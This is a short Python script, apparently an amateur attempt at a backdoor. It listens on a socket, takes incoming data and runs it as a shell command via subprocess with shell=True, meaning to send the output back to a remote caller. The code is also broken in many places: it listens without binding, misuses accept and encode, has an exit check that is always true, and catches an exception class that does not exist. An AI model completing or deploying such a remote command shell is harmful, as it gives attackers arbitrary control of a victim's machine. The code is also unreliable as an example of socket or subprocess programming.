import socket
import os
import sys
import subprocess

sockboi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "joelp"
ipaddr = "192.168.8.1-150"
port = 9999

try:
    with sockboi as s:
        s.listen(5)
        s.accept((ipaddr, port))
        com = subprocess.call(str(s.recv(1024).encode), shell=True)
        while True:
            s.recv(1024)
            s.send(com.decode())
        if com == "exit" or "quit":
            s.close()
            sys.exit()
except ConnectionError:
    print("Connection error you lucky bouii")
    sys.exit()
except socket.socketerror:
    print("could not create socket...")
    sys.exit()
except TimeoutError:
    print("exitting...")
            
